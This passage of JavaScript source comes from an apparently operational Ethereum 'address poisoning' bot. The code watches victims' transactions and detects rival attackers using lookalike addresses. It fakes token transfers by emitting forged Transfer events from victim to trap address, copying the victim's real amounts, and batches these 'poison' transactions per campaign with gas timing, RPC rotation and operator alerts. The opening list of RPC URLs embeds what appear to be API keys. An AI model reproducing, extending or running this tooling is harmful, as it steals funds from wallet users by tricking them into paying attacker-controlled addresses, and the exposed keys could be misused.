    'https://eth-mainnet.g.alchemy.com/v2/alch_0hEit_izstW7cL9Gyz_T_',
    'https://eth-mainnet.g.alchemy.com/v2/alch_A0-PobPGMyEAZ31xva35A',
    'https://eth-mainnet.g.alchemy.com/v2/alch_D_FWof7AulPvkFHZnDlFn',
    'https://eth-mainnet.g.alchemy.com/v2/alch_0hEit_izstW7cL9Gyz_T_',
    'https://eth-mainnet.g.alchemy.com/v2/alch_A0-PobPGMyEAZ31xva35A',
    'https://eth-mainnet.g.alchemy.com/v2/alch_D_FWof7AulPvkFHZnDlFn',
    'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
    'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
    'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
    'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
    'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
    'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
    'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et'
  ],
};

const normalizedChain = chainName?.toLowerCase() || '';
const rawUrls = [chainRpc, ...(PUBLIC_FALLBACKS[normalizedChain] || [])];
const fallbackUrls = Array.from(new Set(rawUrls.filter(Boolean)));

// 🚀 REMOVED SHUFFLE: Respects the exact order of your PUBLIC_FALLBACKS array.
// Your priority public RPCs (PublicNode, 1RPC) will now be tried FIRST, preventing Alchemy's private mempool from swallowing transactions.

const client = createPublicClient({
  chain: viemChain,
  transport: fallback(
    fallbackUrls.map(url => http(url, { timeout: 8000 })),
    { rank: false }
  ),
});


// --- Helper: retry wrapper ---
async function withRpcRetry(fn, context, maxAttempts = 2, baseDelay = 1000, shouldRetry = () => true) {
  return withRetry(fn, context, maxAttempts, baseDelay, shouldRetry);
}

// --- Compute dynamic cooldown ---
function getDynamicCooldown(victimAddress) {
  const timestamps = victimTxTimestamps.get(victimAddress);
  if (!timestamps || timestamps.length < 2) return COOLDOWN_MS;

  let sum = 0;
  const len = timestamps.length;
  for (let i = 1; i < len; i++) {
    sum += timestamps[i] - timestamps[i - 1];
  }
  const avgInterval = sum / (len - 1);

  let cooldown = avgInterval * 0.3;
  return Math.max(MIN_COOLDOWN_MS, Math.min(MAX_COOLDOWN_MS, cooldown));
}

// ─── Asset detection from transaction ───────────────
function getAssetFromTx(tx) {
  if (!tx || !tx.to) return null;
  const to = tx.to.toLowerCase();

  const tokenSymbol = tokenAddressMap.get(to);
  if (tokenSymbol) {
    return tokenSymbol;
  }

  if (tx.value && BigInt(tx.value) > 0n) {
    return nativeSymbol;
  }

  return null;
}


/**
 * Check if a transaction is another attacker poisoning the same victim.
 * 
 * Detects BOTH attack vectors:
 * 1. "Attacker → Victim": tx.to = victim, tx.from = attacker's trap (dust style)
 * 2. "Victim → Attacker": tx.from = victim, tx.to = attacker's trap (forged/mirror style)
 *    ↑ This is MORE dangerous — puts attacker in victim's "recent recipients"
 * 
 * Detection criteria:
 * - Transaction involves our victim (as sender OR receiver)
 * - Other party matches counterparty's prefix (4 chars, excluding 0x) AND suffix (4 chars)
 * - Other party is NOT the real counterparty
 * - Other party is NOT our own trap
 */
function isCompetitivePoison(tx, victimEntry) {
  if (!tx || !tx.from || !tx.to || !victimEntry?.counterparty) return false;

  const to = tx.to.toLowerCase();
  const from = tx.from.toLowerCase();
  const victimLower = victimEntry.victimAddress?.toLowerCase();
  const counterparty = victimEntry.counterparty;
  const ourTrap = victimEntry.trapAddress;

  // Skip if caught victim
  if (caughtVictims.has(victimLower)) return false;

  // Determine which direction the attack is coming from
  let attackDirection = null;
  let suspectAddress = null;

  // Case 1: "Attacker → Victim" (dust style)
  // tx.to = our victim, tx.from = attacker's trap
  if (to === victimLower) {
    // Make sure sender isn't our victim or our own trap
    if (from === victimLower || from === ourTrap) return false;
    attackDirection = 'INCOMING';
    suspectAddress = from;
  }
  // Case 2: "Victim → Attacker" (forged/mirror style) — MORE DANGEROUS
  // tx.from = our victim, tx.to = attacker's trap
  else if (from === victimLower) {
    // Make sure receiver isn't our own trap (don't counter-poison our own emissions)
    if (to === ourTrap) return false;
    attackDirection = 'OUTGOING';
    suspectAddress = to;
  }
  // Transaction doesn't involve our victim
  else {
    return false;
  }

  // Skip if suspect is the real counterparty (legitimate transaction)
  if (suspectAddress === counterparty) return false;

  // 🎯 Match prefix (4 chars, excluding 0x) and suffix (4 chars)
  const prefix = counterparty.slice(2, 6);   // "1234"
  const suffix = counterparty.slice(-4);      // "5678"

  const suspectWithout0x = suspectAddress.slice(2);
  const suspectPrefix = suspectWithout0x.slice(0, 4);
  const suspectSuffix = suspectWithout0x.slice(-4);

  if (suspectPrefix === prefix && suspectSuffix === suffix) {
    logger.info(`[competitive] 🚨 Detected other attacker poisoning our victim!`);
    logger.info(`[competitive] Direction: ${attackDirection} ${attackDirection === 'OUTGOING' ? '(⚠️ more dangerous - in recent recipients)' : '(in incoming history)'}`);
    logger.info(`[competitive] Pattern: prefix="${prefix}" suffix="${suffix}"`);
    logger.info(`[competitive] Other attacker's trap: ${suspectAddress}`);
    logger.info(`[competitive] Real counterparty: ${counterparty}`);
    logger.info(`[competitive] Our trap: ${ourTrap}`);
    return true;
  }

  return false;
}


/**
 * Immediately counter-poison when we detect another attacker.
 * Matches the victim's last REAL transfer amount/asset to look legitimate.
 */
async function counterPoison(victimAddress, victimEntry, tx = null, currentRaw = 0n, currentAsset = null) {
  // 🚀 DASHBOARD TOGGLE CHECK
  const settings = campaignSettings.get(victimEntry.campaignId);

  // If settings loaded and it's explicitly false, BLOCK it.
  if (settings && settings.counterPoisonEnabled === false) {
    logger.info(`[competitive] 🛑 BLOCKED: Counter-poison disabled in dashboard for campaign ${victimEntry.campaignId}`);
    return false;
  }

  const now = Date.now();

  // Prevent spam (min 2 minutes between counter-poisons)
  const lastCounterPoison = victimEntry.lastCounterPoison || 0;
  if (now - lastCounterPoison < 120000) {
    logger.debug(`[competitive] Skipping counter-poison (too recent: ${Math.round((120000 - (now - lastCounterPoison)) / 1000)}s remaining)`);
    return false;
  }

  logger.info(`[competitive] 🎯 Counter-poisoning to stay on top!`);
  logger.info(`[competitive] Victim: ${victimAddress}`);
  logger.info(`[competitive] Our trap: ${victimEntry.trapAddress}`);

  try {
    const campaignWallet = campaignMirrorWallets.get(victimEntry.campaignId);
    if (!campaignWallet) {
      logger.warn(`[competitive] No wallet for campaign ${victimEntry.campaignId}`);
      return false;
    }

    // 🎯 Use the CURRENT transaction amount if available, otherwise check queue, then fallback to DB
    let mirrorRaw = currentRaw || 0n;
    let mirrorAsset = currentAsset || 'ETH';
    let mirrorContract = MIRROR_CONTRACTS[mirrorAsset] || MIRROR_CONTRACTS[mirrorAsset?.toUpperCase()] || MIRROR_TOKEN_NATIVE;

    if (mirrorRaw > 0n) {
      const decimals = getDecimals(mirrorAsset);
      const humanAmount = (Number(mirrorRaw) / (10 ** decimals)).toFixed(4);
      logger.info(`[competitive] ✅ Using current transaction amount: ${humanAmount} ${mirrorAsset}`);
    } else {
      // Fallback 1: Check if an auto-poison is already in the queue for this victim
      let foundInQueue = false;
      for (const [qKey, qItems] of poisonQueue.entries()) {
        const [campId, contractAddr] = qKey.split(':');
        if (campId === victimEntry.campaignId) {
          const existing = qItems.find(i => i.victimAddress.toLowerCase() === victimAddress.toLowerCase() && i.type === 'auto');
          if (existing) {
            mirrorRaw = existing.rawValue;
            mirrorAsset = existing.detectedAsset;
            mirrorContract = contractAddr;
            logger.info(`[competitive] 🔄 Reusing auto-poison amount from queue: ${mirrorRaw} ${mirrorAsset}`);
            foundInQueue = true;
            break;
          }
        }
      }

      // 🚀 Fallback 2: Check in-memory cache of recent blockchain transfers!
      if (!foundInQueue) {
        const recent = recentVictimTransfers.get(victimAddress.toLowerCase());
        if (recent && recent.amount > 0n) {
          mirrorRaw = recent.amount;
          mirrorAsset = recent.asset;
          mirrorContract = MIRROR_CONTRACTS[mirrorAsset] || MIRROR_CONTRACTS[mirrorAsset?.toUpperCase()] || MIRROR_TOKEN_NATIVE;
          const decimals = getDecimals(mirrorAsset);
          const humanAmount = (Number(mirrorRaw) / (10 ** decimals)).toFixed(4);
          logger.info(`[competitive] 🧠 Using recent blockchain cache amount: ${humanAmount} ${mirrorAsset}`);
          foundInQueue = true; // Reuse flag to skip DB
        }
      }

      // 🚀 Fallback 3: Fetch victim→counterparty last transfer directly from blockchain
      if (!foundInQueue && victimEntry.counterparty) {
        const chainResult = await fetchLastTransferFromChain(
          victimAddress.toLowerCase(),
          victimEntry.counterparty.toLowerCase()
        );
        if (chainResult && chainResult.amount > 0n) {
          mirrorRaw = chainResult.amount;
          mirrorAsset = chainResult.asset;
          mirrorContract = MIRROR_CONTRACTS[mirrorAsset] || MIRROR_CONTRACTS[mirrorAsset?.toUpperCase()] || MIRROR_TOKEN_NATIVE;
          const decimals = getDecimals(mirrorAsset);
          const humanAmount = (Number(mirrorRaw) / (10 ** decimals)).toFixed(4);
          logger.info(`[competitive] ⛓️ Using blockchain-fetched amount: ${humanAmount} ${mirrorAsset}`);
          foundInQueue = true; // Skip DB
        }
      }

      // Fallback 4: DB query (only if no current amount, not in queue, not in cache, and not on-chain)
      if (!foundInQueue && supabaseService) {
        try {
          const { data: trapData, error } = await supabaseService
            .from('traps')
            .select('last_transfer_amount, last_transfer_asset')
            .eq('victim_address', victimAddress.toLowerCase())
            .eq('counterparty_address', victimEntry.counterparty?.toLowerCase())
            .limit(1)
            .maybeSingle();

          if (!error && trapData && trapData.last_transfer_amount && trapData.last_transfer_asset) {
            const realAmount = trapData.last_transfer_amount;
            const realAsset = trapData.last_transfer_asset;

            let rawValue = BigInt(0);
            const amountStr = String(realAmount).trim();

            if (amountStr.startsWith('0x') || amountStr.startsWith('0X')) {
              rawValue = BigInt(amountStr);
            } else if (amountStr.includes('.')) {
              const decimals = getDecimals(realAsset);
              const parts = amountStr.split('.');
              const whole = BigInt(parts[0] || '0');
              const fracStr = (parts[1] || '').padEnd(decimals, '0').slice(0, decimals);
              const frac = BigInt(fracStr || '0');
              rawValue = whole * (10n ** BigInt(decimals)) + frac;
            } else {
              rawValue = BigInt(amountStr);
            }

            if (rawValue > 0n) {
              mirrorRaw = rawValue;
              mirrorAsset = realAsset;
              mirrorContract = MIRROR_CONTRACTS[realAsset] || MIRROR_CONTRACTS[realAsset?.toUpperCase()] || MIRROR_TOKEN_NATIVE;

              const decimals = getDecimals(realAsset);
              const humanAmount = (Number(mirrorRaw) / (10 ** decimals)).toFixed(4);
              logger.info(`[competitive] 🗄️ Fallback to DB historical amount: ${humanAmount} ${realAsset}`);
            }
          } else {
            logger.info(`[competitive] No real transfer history found, using default 1 ETH`);
          }
        } catch (dbErr) {
          logger.warn(`[competitive] Failed to fetch last transfer: ${dbErr.message}, using default`);
        }
      }

      // Final fallback if still 0
      if (mirrorRaw === 0n) {
        mirrorRaw = BigInt('1000000000000000000'); // 1 ETH
        mirrorAsset = 'ETH';
        mirrorContract = MIRROR_TOKEN_NATIVE;
      }
    }

    // 🚀 BATCH: Queue instead of emitting immediately
    queuePoison(
      victimEntry.campaignId,
      mirrorContract,
      victimAddress,
      victimEntry.trapAddress,
      mirrorRaw,
      'counter',
      victimEntry,
      mirrorAsset
    );

    return true;
  } catch (err) {
    logger.error(`[competitive] Counter-poison queue failed: ${err.message}`);
  }

  return false;
}


// 🚀 BLOCKCHAIN FETCH: Gets the victim's last real transfer to counterparty from chain
async function fetchLastTransferFromChain(victimAddress, counterpartyAddress) {
  try {
    const currentBlock = await client.getBlockNumber();
    const fromBlock = currentBlock > 5000n ? currentBlock - 5000n : 0n;

    // Fetch ERC-20 Transfer logs: victim → counterparty
    const logs = await client.request({
      method: 'eth_getLogs',
      params: [{
        fromBlock: `0x${fromBlock.toString(16)}`,
        toBlock: 'latest',
        topics: [
          '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef',
          '0x000000000000000000000000' + victimAddress.slice(2),
          '0x000000000000000000000000' + counterpartyAddress.slice(2)
        ]
      }]
    });

    if (!logs || logs.length === 0) {
      logger.info(`[chain-fetch] No recent victim→counterparty transfers found on-chain for ${victimAddress.slice(0, 10)}...`);
      return null;
    }

    // Get the MOST RECENT log (last in array)
    const lastLog = logs[logs.length - 1];
    const rawAmount = BigInt(lastLog.data);
    const contractAddress = lastLog.address?.toLowerCase() || '';
    const assetSymbol = tokenAddressMap.get(contractAddress) || null;

    if (rawAmount > 0n && assetSymbol) {
      const decimals = getDecimals(assetSymbol);
      const humanAmount = (Number(rawAmount) / (10 ** decimals)).toFixed(4);
      logger.info(`[chain-fetch] ✅ Found on-chain: ${humanAmount} ${assetSymbol} (victim→counterparty)`);

      // Cache it for future use
      recentVictimTransfers.set(victimAddress.toLowerCase(), { amount: rawAmount, asset: assetSymbol, timestamp: Date.now() });

      return { amount: rawAmount, asset: assetSymbol };
    }

    return null;
  } catch (err) {
    logger.warn(`[chain-fetch] Failed to fetch from blockchain: ${err.message}`);
    return null;
  }
}



function computeMirrorRawValue(tx, detectedAsset) {
  try {
    // ERC-20 transfer(to, value) - selector 0xa9059cbb
    if (tx.input && tx.input.startsWith('0xa9059cbb') && tx.input.length >= 138) {
      return BigInt('0x' + tx.input.slice(74, 138));
    }
    // ERC-20 transferFrom(from, to, value) - selector 0x23b872dd
    if (tx.input && tx.input.startsWith('0x23b872dd') && tx.input.length >= 202) {
      return BigInt('0x' + tx.input.slice(138, 202));
    }
    // Native transfer (value is in tx.value, already in wei = 18 decimals)
    if (tx.value && BigInt(tx.value) > 0n) {
      return BigInt(tx.value);
    }
    return 0n;
  } catch {
    return 0n;
  }
}

// Per-campaign lock to prevent nonce collisions within same funding wallet
const campaignMirrorLocks = new Map();
// Rate-limit gas insufficient alerts (one per operator per hour)
const lastGasAlertTime = new Map();


function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, campaignId, contractAddress) {
  if (!walletClient || !contractAddress) return Promise.resolve(false);

  if (!campaignMirrorLocks.has(campaignId)) {
    campaignMirrorLocks.set(campaignId, Promise.resolve());
  }

  const currentLock = campaignMirrorLocks.get(campaignId);
  const operatorAddress = walletClient.account.address;

  const run = currentLock.then(async () => {
    // ═══════════════════════════════════════════════════════
    // PRE-CHECK: Verify operator has enough native for gas
    // ═══════════════════════════════════════════════════════
    try {
      const [operatorBalance, gasPrice] = await Promise.all([
        client.getBalance({ address: operatorAddress }),
        client.getGasPrice(),
      ]);

      // Mirror events typically need ~60,000 gas (exact match with duster.py)
      const estimatedGas = 60000n;
      const estimatedGasCost = estimatedGas * gasPrice;

      if (operatorBalance < estimatedGasCost) {
        const neededEth = Number(estimatedGasCost) / 1e18;
        const haveEth = Number(operatorBalance) / 1e18;
        const shortfallEth = neededEth - haveEth;

        logger.error(
          `[mirror] Operator ${operatorAddress} has insufficient gas. ` +
          `Need ${neededEth.toFixed(8)} ${nativeSymbol}, have ${haveEth.toFixed(8)} ${nativeSymbol}`
        );

        // Rate-limited Telegram alert (once per hour per operator)
        const now = Date.now();
        const lastAlert = lastGasAlertTime.get(operatorAddress) || 0;
        if (now - lastAlert > 3600000) {
          let priceLine = '';
          let fundSuggestion = '0.01';

          try {
            const coinId = chainName === 'ethereum' ? 'ethereum' :
              chainName === 'bsc' ? 'binancecoin' : 'matic-network';
            const response = await fetch(
              `https://api.coingecko.com/api/v3/simple/price?ids=${coinId}&vs_currencies=usd`,
              { signal: AbortSignal.timeout(3000) }
            );
            const priceData = await response.json();
            const nativePrice = priceData[coinId]?.usd || 0;

            if (nativePrice > 0) {
              const neededUsd = neededEth * nativePrice;
              const haveUsd = haveEth * nativePrice;
              const fundUsd = Math.max(10, shortfallEth * nativePrice * 100);
              const fundEth = fundUsd / nativePrice;
              priceLine = ` (~$${neededUsd.toFixed(2)} needed, ~$${haveUsd.toFixed(4)} balance)`;
              fundSuggestion = `${fundEth.toFixed(4)} ${nativeSymbol} (~$${fundUsd.toFixed(2)})`;
            }
          } catch (priceErr) {
            logger.debug(`[mirror] Could not fetch ${nativeSymbol} price: ${priceErr.message}`);
          }

          const alertMsg =
            `⛽ Insufficient Gas in Funding Wallet\n\n` +
            `Your campaign funding wallet cannot emit mirror events in real-time.\n\n` +
            `🔑 Wallet: \`${operatorAddress}\`\n` +
            `📊 Needed: \`${neededEth.toFixed(8)} ${nativeSymbol}\`${priceLine}\n` +
            `💰 Balance: \`${haveEth.toFixed(8)} ${nativeSymbol}\`\n` +
            `📉 Shortfall: \`${shortfallEth.toFixed(8)} ${nativeSymbol}\`\n\n` +
            `💡 Fund this wallet with at least **${fundSuggestion}** to continue real-time mirror operations.`;

          try {
            await sendAlert(alertMsg, 'warning', campaignId);
          } catch (alertErr) {
            logger.warn(`[mirror] Failed to send gas alert: ${alertErr.message}`);
          }
          lastGasAlertTime.set(operatorAddress, now);
        }

        return false;
      }
    } catch (checkErr) {
      logger.warn(`[mirror] Pre-flight gas check failed (will still attempt tx): ${checkErr.message}`);
    }

    // ═══════════════════════════════════════════════════════
    // ACTUAL TRANSACTION: Emit forged Transfer event
    // ═══════════════════════════════════════════════════════

    // 🚀 FIX: Get explicit nonce to prevent race conditions on RPC load balancers
    let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);

    // 🚀 SMART GAS STRATEGY: Wait for cheap gas, but fallback to spot price if it takes too long
    let maxFeePerGas = 2000000000n; // 2 gwei default fallback
    let maxPriorityFeePerGas = 10000000n; // 0.01 gwei tip fallback
    const TARGET_MAX_FEE_GWEI = 1.5; // The cheap rate we want
    const targetMaxFee = BigInt(Math.floor(TARGET_MAX_FEE_GWEI * 1000)) * 1000000n;
    const networkTip = 10000000n; // 0.01 gwei tip

    try {
      const block = await client.getBlock({ blockTag: 'latest' });
      let baseFee = block.baseFeePerGas || 0n;
      let finalMaxFee = baseFee + networkTip; // Default to current market rate

      if (baseFee <= targetMaxFee) {
        // Network is cheap right now, fire immediately!
        finalMaxFee = baseFee + networkTip;
        logger.info(`[gas-strategy] ✅ Base fee is cheap (${(Number(baseFee) / 1e9).toFixed(2)} Gwei). Firing immediately!`);
      } else {
        // Network is expensive. Wait up to 10 minutes for it to drop.
        logger.info(`[gas-strategy] ⏳ Base fee is ${(Number(baseFee) / 1e9).toFixed(2)} Gwei. Waiting up to 10 mins for it to drop to <${TARGET_MAX_FEE_GWEI} Gwei...`);

        let gasDropped = false;
        for (let i = 0; i < 50; i++) { // 50 blocks * 12 seconds = 10 minutes
          await new Promise(resolve => setTimeout(resolve, 12000)); // Wait 1 Ethereum block

          try {
            const currentBlock = await client.getBlock({ blockTag: 'latest' });
            const currentBaseFee = currentBlock.baseFeePerGas || 0n;

            if (currentBaseFee <= targetMaxFee) {
              finalMaxFee = currentBaseFee + networkTip;
              gasDropped = true;
              logger.info(`[gas-strategy] ✅ Base fee dropped to ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei! Firing at cheap rate!`);
              break;
            }

            // Log every minute so you can watch it waiting
            if (i % 5 === 0) {
              logger.info(`[gas-strategy] ⏳ Still waiting... Current base fee: ${(Number(currentBaseFee) / 1e9).toFixed(2)} Gwei`);
            }
          } catch (e) {
            logger.warn(`[gas-strategy] Failed to check base fee: ${e.message}`);
            break;
          }
        }

        if (!gasDropped) {
          // Gas didn't drop in 10 minutes. Fire at current market rate to prevent stuck nonces.
          try {
            const fallbackBlock = await client.getBlock({ blockTag: 'latest' });
            const fallbackBaseFee = fallbackBlock.baseFeePerGas || baseFee;
            finalMaxFee = fallbackBaseFee + networkTip;
            logger.warn(`[gas-strategy] ⚠️ Gas stayed high for 10 mins. Firing at current market rate (${(Number(fallbackBaseFee) / 1e9).toFixed(2)} Gwei) to prevent stuck nonces.`);
          } catch (e) {
            finalMaxFee = baseFee + networkTip;
            logger.warn(`[gas-strategy] ⚠️ Gas check failed. Firing at original base fee.`);
          }
        }
      }

      maxFeePerGas = finalMaxFee;
      maxPriorityFeePerGas = networkTip;

    } catch (e) {
      logger.warn(`[gas-strategy] Failed to estimate fees, using defaults: ${e.message}`);
    }

    // 🚀 CRITICAL SAFETY: Ensure priority fee is NEVER higher than max fee
    if (maxPriorityFeePerGas >= maxFeePerGas) {
      maxPriorityFeePerGas = maxFeePerGas / 2n;
    }

    // 🚀 ROTATION FIX: Manually rotate through RPC endpoints on rate limits
    let lastError = null;
    let hash = null;

    // Get list of RPC URLs to rotate through
    const rpcUrls = fallbackUrls.length > 0 ? fallbackUrls : [chainRpc];
    const maxAttempts = rpcUrls.length; // 🚀 FIX: Try ALL available RPCs in the list

    for (let attempt = 0; attempt < maxAttempts; attempt++) {
      try {
        // Create a temporary wallet client with a single specific RPC for this attempt
        const tempTransport = http(rpcUrls[attempt % rpcUrls.length], { timeout: 15000 });
        const tempWalletClient = createWalletClient({
          account: walletClient.account,
          chain: viemChain,
          transport: tempTransport,
        });

        hash = await tempWalletClient.writeContract({
          address: contractAddress,
          abi: MIRROR_TOKEN_ABI,
          functionName: 'transferFrom',
          args: [victimAddress, trapAddress, rawValue],
          nonce: nonce,
          gas: 60000n, // 🚀 Exact match with duster.py gas limit
          maxFeePerGas: maxFeePerGas, // 🚀 FIX: Hardcode fees to bypass flaky eth_gasPrice
          maxPriorityFeePerGas: maxPriorityFeePerGas,
        });

        // Success! Break out of retry loop
        logger.info(`[mirror] Successfully used RPC ${attempt + 1}/${maxAttempts}: ${rpcUrls[attempt % rpcUrls.length].slice(0, 50)}...`);
        break;
      } catch (err) {
        lastError = err;
        const errMsg = err.message || String(err);
        const currentRpc = rpcUrls[attempt % rpcUrls.length].replace('https://', '').slice(0, 30);

        // 🚀 NONCE SYNC FIX: If the network rejects the nonce (too low OR too high), fetch a fresh one immediately
        if (errMsg.includes('nonce too low') || errMsg.includes('lower than the') || errMsg.includes('higher than the') || errMsg.includes('replacement transaction') || errMsg.includes('nonce has already been used')) {
          logger.warn(`[mirror] Nonce out of sync on ${currentRpc}. Fetching fresh nonce...`);
          try {
            const freshNonce = await client.getTransactionCount({ address: operatorAddress, blockTag: 'pending' })
              .catch(() => client.getTransactionCount({ address: operatorAddress }));
            nonce = freshNonce;
            const nonces = campaignNonces.get(campaignId);
            if (nonces) nonces.set(operatorAddress, freshNonce);
          } catch (nonceErr) {
            logger.warn(`[mirror] Failed to fetch fresh nonce: ${nonceErr.message}`);
          }
        }

        // 🚀 FIX: Rotate on ALMOST ALL errors because public RPCs have broken simulation engines.
        // Only abort immediately if it's a fatal wallet-level error.
        const isFatal =
          errMsg.includes('invalid private key') ||
          errMsg.includes('unknown account') ||
          errMsg.includes('missing revert data');

        if (isFatal) {
          throw err;
        }

        logger.warn(`[mirror] RPC ${attempt + 1}/${maxAttempts} (${currentRpc}) failed: ${errMsg.slice(0, 60)}... rotating`);
        await new Promise(resolve => setTimeout(resolve, 1000));
        continue; // Try next RPC
      }
    }

    if (!hash && lastError) {
      throw lastError;
    }

    // 🚀 CRITICAL FIX: Wait for the transaction to be ACTUALLY MINED before moving on.
    let receiptSuccess = false;
    try {
      const receipt = await client.waitForTransactionReceipt({
        hash: hash,
        timeout: 90000, // 90 seconds max wait
        confirmations: 1,
      });
      logger.info(`[mirror] ✅ TX confirmed in block ${receipt.blockNumber} (status: ${receipt.status})`);
      receiptSuccess = true;
    } catch (waitErr) {
      logger.warn(`[mirror] ⚠️ TX ${hash.slice(0, 14)}... not confirmed in 90s (may have been dropped): ${waitErr.message?.slice(0, 60)}`);
    }

    if (receiptSuccess) {
      confirmNonceIncrement(campaignId, operatorAddress);
      logger.info(`[mirror] Forged Transfer emitted via ${contractAddress.slice(0, 10)}...: ${victimAddress} → ${trapAddress} raw=${rawValue} tx=${hash}`);
      return hash;
    } else {
      logger.warn(`[mirror] 🔄 Clearing local nonce for ${operatorAddress.slice(0, 10)}... to prevent desync.`);
      const nonces = campaignNonces.get(campaignId);
      if (nonces) nonces.delete(operatorAddress);
      logger.error(`[mirror] ❌ Transfer timed out and was dropped by the network. tx=${hash}`);
      return false; // 🚀 FIX: Return false so it triggers the failure alert instead of a fake success!
    }

  }).catch(err => {
    const errMsg = err.message || String(err);

    // 🚀 FIX: Rollback nonce on failure so next attempt gets correct nonce
    const nonces = campaignNonces.get(campaignId);
    if (nonces && nonces.has(operatorAddress)) {
      nonces.set(operatorAddress, Math.max(0, nonces.get(operatorAddress) - 1));
    }

    if (errMsg.toLowerCase().includes('insufficient funds') ||
      errMsg.toLowerCase().includes('gas')) {
      logger.error(`[mirror] Transaction failed due to gas: ${errMsg}`);
    } else if (errMsg.includes('rate-limit') || errMsg.includes('capacity')) {
      logger.error(`[mirror] RPC rate limited: ${errMsg.slice(0, 80)}`);
    } else {
      logger.warn(`[mirror] Failed to emit forged transfer: ${errMsg}`);
    }
    return false;
  });

  campaignMirrorLocks.set(campaignId, run.then(() => { }));
  return run;
}

// ═══════════════════════════════════════════════════════════
// 🚀 BATCH PROCESSING: Queue and Flush System
// ═══════════════════════════════════════════════════════════

function queuePoison(campaignId, contractAddress, victimAddress, trapAddress, rawValue, type, entry, detectedAsset) {
  // 🚀 MULTI-TOKEN FIX: Group by campaign only, not by contract
  // This allows different tokens to be batched together
  const key = `${campaignId}`;

  if (!poisonQueue.has(key)) {
    poisonQueue.set(key, []);
  }

  const queue = poisonQueue.get(key);

  // 🚀 DEDUPLICATION FIX: Prevent duplicate victim -> trap pairs in the same batch
  const existingIndex = queue.findIndex(item =>
    item.victimAddress.toLowerCase() === victimAddress.toLowerCase() &&
    item.trapAddress.toLowerCase() === trapAddress.toLowerCase()
  );

  if (existingIndex !== -1) {
    const existingItem = queue[existingIndex];

    // 🚀 FIX: If an auto-poison is already in queue, and a counter-poison comes in,
    // we WANT to use the auto-poison's REAL-TIME amount, but mark it as overridden!
    if (existingItem.type === 'auto' && type === 'counter') {
      existingItem.type = 'counter'; // Change icon to 🏆
      existingItem.overridden = true; // Mark as overridden for the alert
      // DO NOT change existingItem.rawValue or existingItem.detectedAsset!
      logger.info(`[batch] ⚠️ Auto-poison overridden by counter-poison for ${victimAddress.slice(0, 10)}... (Keeping real-time amount: ${existingItem.rawValue} ${existingItem.detectedAsset})`);
      return;
    }

    // If a counter-poison is already in queue, and an auto-poison comes in,
    // Upgrade to auto, keep auto's real-time amount
    if (existingItem.type === 'counter' && type === 'auto') {
      existingItem.type = 'auto';
      existingItem.rawValue = rawValue;
      existingItem.detectedAsset = detectedAsset;
      existingItem.overridden = false;
      logger.info(`[batch] ⬆️ Counter-poison upgraded to auto-poison for ${victimAddress.slice(0, 10)}...`);
      return;
    }

    // If both are the same type, just update the timestamp and value
    existingItem.rawValue = rawValue;
    existingItem.detectedAsset = detectedAsset;
    existingItem.timestamp = Date.now();
    logger.info(`[batch] ♻️ Deduplicated: ${victimAddress.slice(0, 10)}... → ${trapAddress.slice(0, 10)}... already in queue. Updated existing.`);
    return;
  }

  queue.push({
    victimAddress,
    trapAddress,
    rawValue,
    type,
    entry,
    detectedAsset,
    timestamp: Date.now()
  });

  logger.info(`[batch] 📦 Queued ${type} poison for ${victimAddress.slice(0, 10)}... (${queue.length}/${BATCH_FLUSH_THRESHOLD} in batch)`);

  if (!queueFlushTimer && queue.length === 1) {
    queueFlushTimer = setTimeout(() => {
      logger.info(`[batch] ⏰ Flush timer expired — flushing all queues`);
      flushAllQueues();
    }, BATCH_FLUSH_INTERVAL_MS);
  }

  if (queue.length >= BATCH_FLUSH_THRESHOLD) {
    logger.info(`[batch] 🚀 Threshold reached — flushing queue immediately`);
    // 🚀 FIX: Await the flush to prevent concurrent flushes from racing on the same nonce
    flushQueue(key).catch(err => logger.warn(`[batch] Threshold flush error: ${err.message}`));
  }
}

async function flushAllQueues() {
  if (queueFlushTimer) {
    clearTimeout(queueFlushTimer);
    queueFlushTimer = null;
  }

  const keys = Array.from(poisonQueue.keys());
  for (const key of keys) {
    await flushQueue(key);
  }
}

async function flushQueue(key) {
  const items = poisonQueue.get(key);

  logger.info(`[batch] 🔄 Flushing queue for campaign ${key}: ${items?.length || 0} items`);

  if (!items || items.length === 0) {
    poisonQueue.delete(key);
    logger.debug(`[batch] Queue for ${key} was empty, skipping flush`);
    return;
  }

  poisonQueue.delete(key);

  const campaignId = key;
  const campaignWallet = campaignMirrorWallets.get(campaignId);

  if (!campaignWallet) {
    logger.error(`[batch] No wallet for campaign ${campaignId}, dropping ${items.length} queued items`);
    await sendBatchFailureAlert(items, 'No funding wallet configured', null);
    return;
  }

  const operatorAddress = campaignWallet.operatorAddress;

  // Group items by contract address
  const contractGroups = new Map();
  for (const item of items) {
    let contractAddr = MIRROR_CONTRACTS[item.detectedAsset] ||
      MIRROR_CONTRACTS[item.detectedAsset?.toUpperCase()] ||
      MIRROR_TOKEN_NATIVE;

    if (!contractAddr) {
      logger.warn(`[batch] No contract found for asset ${item.detectedAsset}, skipping`);
      continue;
    }

    if (!contractGroups.has(contractAddr)) {
      contractGroups.set(contractAddr, []);
    }
    contractGroups.get(contractAddr).push(item);
  }

  // If only one contract group, use the existing single-contract batch
  if (contractGroups.size === 1) {
    const [contractAddr, groupItems] = [...contractGroups.entries()][0];

    if (groupItems.length === 1) {
      const item = groupItems[0];
      const hash = await emitForgedTransfer(
        item.victimAddress,
        item.trapAddress,
        item.rawValue,
        campaignWallet.walletClient,
        campaignId,
        contractAddr
      );
      if (hash) {
        await sendBatchAlert([item], hash, contractAddr);
        updateBatchStats([item], true);
      } else {
        updateBatchStats([item], false);

        // 🚀 FIX: Removed hanging client.getBalance() RPC calls
